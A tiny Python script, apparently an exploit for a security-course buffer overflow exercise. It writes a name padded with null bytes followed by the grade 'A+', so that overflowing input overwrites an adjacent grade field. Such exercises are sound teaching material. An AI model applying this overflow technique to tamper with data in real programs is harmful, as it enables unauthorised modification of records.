#!/usr/bin/env python3

import sys

name = b'jkanaya' + b'\x00' * 3
grade = b'A+'


payload = name + grade

sys.stdout.buffer.write(payload)